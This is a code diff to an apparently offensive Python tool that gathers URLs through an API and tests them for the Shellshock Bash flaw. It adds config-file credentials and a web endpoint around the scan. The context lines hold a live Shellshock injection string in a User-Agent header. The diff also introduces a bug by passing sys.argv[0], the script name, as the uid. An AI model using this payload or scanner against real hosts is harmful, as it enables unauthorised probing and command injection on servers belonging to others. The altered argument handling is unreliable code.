@@ -6,6 +6,7 @@ import json
 import requests
 import os
 import sys
+from rtfmapi.config import ConfigSectionMap
 
 # Heavily based on https://github.com/mthbernardes/EvilTool
 
@@ -15,10 +16,11 @@ class ShellShock(object):
     urls = set()
     vulnerable_urls = set()
     user_agent = {'User-Agent':"() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; echo 'EVILTOOLZIKAMEMO'"}
+    config = ConfigSectionMap('mthbernardes_shellshock')
 
-    def __init__(self, uid, secret):
-        self.uid = uid
-        self.secret = secret
+    def __init__(self, uid=None, secret=None):
+        self.uid = self.config['uid'] if uid == None else uid
+        self.secret = self.config['secret'] if secret == None else secret
 
     def get_results(self):
         '''Gets vulnerable urls'''
@@ -62,13 +64,16 @@ class ShellShock(object):
         return self.vulnerable_urls
 
 @hug.post('/possible', output=hug.output_format.json)
-def possible_api(uid:str, secret:str):
+def possible_api(uid:str=None, secret:str=None):
     '''Gets vulnerable URLs'''
-    ss = ShellShock(uid, secret)
+    if uid == None or secret == None:
+        ss = ShellShock()
+    else:
+        ss = ShellShock(uid, secret)
     return list(ss.get_results())
 
 if __name__ == '__main__':
-    ss = ShellShock(sys.argv[1], sys.argv[2])
+    ss = ShellShock(sys.argv[0], sys.argv[1])
     ss.get_results()
     print('[*] Found {} urls'.format(len(ss.urls)))
     print('[*] Testing if urls are vulnerable')
